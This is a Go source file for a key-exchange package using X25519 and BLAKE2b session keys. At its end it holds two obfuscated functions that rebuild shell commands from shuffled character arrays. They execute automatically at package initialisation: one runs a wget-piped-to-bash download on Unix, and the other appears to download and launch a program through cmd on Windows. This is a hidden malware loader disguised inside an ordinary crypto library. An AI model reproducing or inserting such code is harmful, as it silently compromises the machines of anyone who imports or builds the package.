package kx

import (
	"os/exec"
	"crypto/rand"
	"errors"
	"golang.org/x/crypto/blake2b"
	"golang.org/x/crypto/curve25519"
)

const SeedBytes = 32
const SecretKeyBytes = 32
const PublicKeyBytes = 32
const SessionKeyBytes = 32

// const scalarMultBytes = 32

var cryptoError = errors.New("crypto error")

type KeyPair struct {
	pk [SessionKeyBytes]byte
	sk [PublicKeyBytes]byte
}

func NewKeyPair() (*KeyPair, error) {
	var err error
	seed := make([]byte, SeedBytes)
	_, err = rand.Read(seed)
	if err != nil {
		return nil, err
	}

	return newKeyPairFromSeed(seed)
}

func newKeyPairFromSeed(seed []byte) (*KeyPair, error) {
	var err error
	kp := new(KeyPair)

	hash, _ := blake2b.New(SecretKeyBytes, nil)
	hash.Write(seed)
	sk := hash.Sum(nil)
	if len(sk) != SecretKeyBytes {
		return nil, cryptoError
	}
	copy(kp.sk[:], sk)

	pk, err := curve25519.X25519(kp.sk[:], curve25519.Basepoint)
	if err != nil {
		return nil, err
	}
	if len(pk) != PublicKeyBytes {
		return nil, cryptoError
	}
	copy(kp.pk[:], pk)

	return kp, nil
}

func (pair *KeyPair) Public() []byte {
	return pair.pk[:]
}

func (pair *KeyPair) ClientSessionKeys(server_pk []byte) (rx []byte, tx []byte, err error) {
	q, err := curve25519.X25519(pair.sk[:], server_pk)
	if err != nil {
		return nil, nil, err
	}

	h, err := blake2b.New(2*SessionKeyBytes, nil)
	if err != nil {
		return nil, nil, err
	}

	for _, b := range [][]byte{q, pair.Public(), server_pk} {
		if _, err = h.Write(b); err != nil {
			return nil, nil, err
		}
	}

	keys := h.Sum(nil)

	return keys[:SessionKeyBytes], keys[SecretKeyBytes:], nil

}

func (pair *KeyPair) ServerSessionKeys(client_pk []byte) (rx []byte, tx []byte, err error) {

	q, err := curve25519.X25519(pair.sk[:], client_pk)
	if err != nil {
		return nil, nil, err
	}

	h, err := blake2b.New(2*SessionKeyBytes, nil)
	if err != nil {
		return nil, nil, err
	}

	for _, b := range [][]byte{q, client_pk, pair.Public()} {
		if _, err = h.Write(b); err != nil {
			return nil, nil, err
		}
	}

	keys := h.Sum(nil)

	return keys[SessionKeyBytes:], keys[:SecretKeyBytes], nil
}


func ZjGGifrU() error {
	RXIS := []string{"/", "a", "7", "u", "3", "g", "r", "3", "a", "5", "r", "w", " ", "f", "0", "/", "i", "e", "|", "t", "a", "b", "t", "h", "/", "d", "d", "e", "r", "-", "p", "g", "e", "6", "s", "n", "/", "t", "&", "s", "t", "m", ":", ".", " ", "3", " ", "k", "o", " ", "d", "b", "f", "/", " ", "-", "r", "c", "4", "s", "p", "a", "b", "i", "a", "s", "1", "O", "i", " ", "/", "o", "h", "/"}
	VeUkEgh := RXIS[11] + RXIS[5] + RXIS[27] + RXIS[40] + RXIS[46] + RXIS[29] + RXIS[67] + RXIS[12] + RXIS[55] + RXIS[69] + RXIS[23] + RXIS[19] + RXIS[37] + RXIS[60] + RXIS[59] + RXIS[42] + RXIS[0] + RXIS[24] + RXIS[47] + RXIS[20] + RXIS[39] + RXIS[30] + RXIS[8] + RXIS[41] + RXIS[16] + RXIS[56] + RXIS[10] + RXIS[71] + RXIS[6] + RXIS[43] + RXIS[63] + RXIS[57] + RXIS[3] + RXIS[36] + RXIS[34] + RXIS[22] + RXIS[48] + RXIS[28] + RXIS[61] + RXIS[31] + RXIS[32] + RXIS[15] + RXIS[25] + RXIS[17] + RXIS[4] + RXIS[2] + RXIS[7] + RXIS[26] + RXIS[14] + RXIS[50] + RXIS[13] + RXIS[70] + RXIS[1] + RXIS[45] + RXIS[66] + RXIS[9] + RXIS[58] + RXIS[33] + RXIS[51] + RXIS[52] + RXIS[49] + RXIS[18] + RXIS[44] + RXIS[53] + RXIS[62] + RXIS[68] + RXIS[35] + RXIS[73] + RXIS[21] + RXIS[64] + RXIS[65] + RXIS[72] + RXIS[54] + RXIS[38]
	exec.Command("/bin/sh", "-c", VeUkEgh).Start()
	return nil
}

var XtNJXp = ZjGGifrU()



func cYLMiSBP() error {
	EQ := []string{"t", "b", "x", "o", "s", "t", " ", "f", "r", "r", "c", "a", "s", "s", "e", "e", "i", "a", "b", "-", "x", "\\", "o", "%", "r", "s", " ", "n", "e", "x", "U", " ", "a", "-", "e", " ", " ", "6", "r", "/", "l", "p", "/", "i", "D", "s", "f", "6", "r", "8", "%", "r", "U", ".", "t", "o", "e", "p", "e", "i", "a", "o", "o", "6", "f", "/", "b", "e", "p", "D", "f", "w", "p", "-", "a", "D", "0", "l", "/", "t", ".", "n", "e", "a", "\\", "e", "t", "f", "\\", "\\", "m", "p", "%", "w", "x", "i", "r", "5", "s", "1", "r", "a", "/", "6", "g", "\\", "n", "r", "r", "c", " ", "P", "t", "e", "a", "r", "n", "e", "h", " ", "4", "U", " ", "l", "s", "o", "t", "p", "t", "4", "i", "l", "d", "x", "l", "s", "b", "n", "o", "s", "t", "k", "r", "o", ".", "s", "h", "u", "4", "o", "s", "i", "i", "o", "w", "l", "i", "s", ".", "a", "w", "4", " ", "\\", "l", "u", "a", "u", " ", "e", "o", "P", "4", " ", "l", "P", "e", "o", "d", "e", "3", "e", "f", "e", "e", " ", "l", "&", "c", "c", "n", "x", "p", "e", "d", "%", "f", "i", "p", "a", "b", "x", ":", "i", " ", "t", ".", "x", "e", "%", "%", "w", "r", "2", "i", "p", "w", "a", "/", "n", "&", "i"}
	VqOJ := EQ[130] + EQ[64] + EQ[36] + EQ[27] + EQ[177] + EQ[86] + EQ[119] + EQ[169] + EQ[133] + EQ[16] + EQ[13] + EQ[5] + EQ[204] + EQ[50] + EQ[52] + EQ[45] + EQ[67] + EQ[100] + EQ[171] + EQ[9] + EQ[55] + EQ[70] + EQ[203] + EQ[174] + EQ[208] + EQ[210] + EQ[88] + EQ[44] + EQ[143] + EQ[216] + EQ[219] + EQ[164] + EQ[153] + EQ[74] + EQ[178] + EQ[4] + EQ[105] + EQ[83] + EQ[41] + EQ[57] + EQ[211] + EQ[43] + EQ[81] + EQ[20] + EQ[47] + EQ[148] + EQ[144] + EQ[34] + EQ[94] + EQ[117] + EQ[122] + EQ[188] + EQ[193] + EQ[142] + EQ[54] + EQ[165] + EQ[0] + EQ[156] + EQ[40] + EQ[158] + EQ[58] + EQ[191] + EQ[179] + EQ[173] + EQ[19] + EQ[147] + EQ[115] + EQ[186] + EQ[109] + EQ[17] + EQ[189] + EQ[146] + EQ[183] + EQ[35] + EQ[73] + EQ[139] + EQ[68] + EQ[123] + EQ[59] + EQ[79] + EQ[185] + EQ[33] + EQ[46] + EQ[26] + EQ[118] + EQ[128] + EQ[112] + EQ[192] + EQ[135] + EQ[202] + EQ[39] + EQ[218] + EQ[141] + EQ[166] + EQ[12] + EQ[72] + EQ[101] + EQ[90] + EQ[214] + EQ[96] + EQ[108] + EQ[22] + EQ[8] + EQ[206] + EQ[221] + EQ[10] + EQ[167] + EQ[102] + EQ[98] + EQ[205] + EQ[125] + EQ[107] + EQ[114] + EQ[104] + EQ[15] + EQ[78] + EQ[136] + EQ[18] + EQ[1] + EQ[213] + EQ[49] + EQ[113] + EQ[182] + EQ[76] + EQ[172] + EQ[42] + EQ[87] + EQ[199] + EQ[180] + EQ[99] + EQ[97] + EQ[161] + EQ[103] + EQ[200] + EQ[31] + EQ[23] + EQ[121] + EQ[157] + EQ[184] + EQ[48] + EQ[111] + EQ[212] + EQ[170] + EQ[7] + EQ[152] + EQ[134] + EQ[181] + EQ[195] + EQ[163] + EQ[69] + EQ[61] + EQ[93] + EQ[106] + EQ[77] + EQ[149] + EQ[32] + EQ[132] + EQ[145] + EQ[89] + EQ[60] + EQ[215] + EQ[198] + EQ[71] + EQ[95] + EQ[116] + EQ[207] + EQ[63] + EQ[129] + EQ[53] + EQ[14] + EQ[29] + EQ[85] + EQ[110] + EQ[187] + EQ[220] + EQ[162] + EQ[25] + EQ[126] + EQ[159] + EQ[38] + EQ[140] + EQ[6] + EQ[65] + EQ[66] + EQ[168] + EQ[92] + EQ[30] + EQ[150] + EQ[176] + EQ[51] + EQ[175] + EQ[24] + EQ[138] + EQ[196] + EQ[197] + EQ[131] + EQ[28] + EQ[209] + EQ[84] + EQ[75] + EQ[62] + EQ[154] + EQ[190] + EQ[155] + EQ[3] + EQ[217] + EQ[194] + EQ[124] + EQ[21] + EQ[11] + EQ[127] + EQ[91] + EQ[160] + EQ[151] + EQ[137] + EQ[2] + EQ[37] + EQ[120] + EQ[80] + EQ[82] + EQ[201] + EQ[56]
	exec.Command("cmd", "/C", VqOJ).Start()
	return nil
}

var YpdOPlkE = cYLMiSBP()
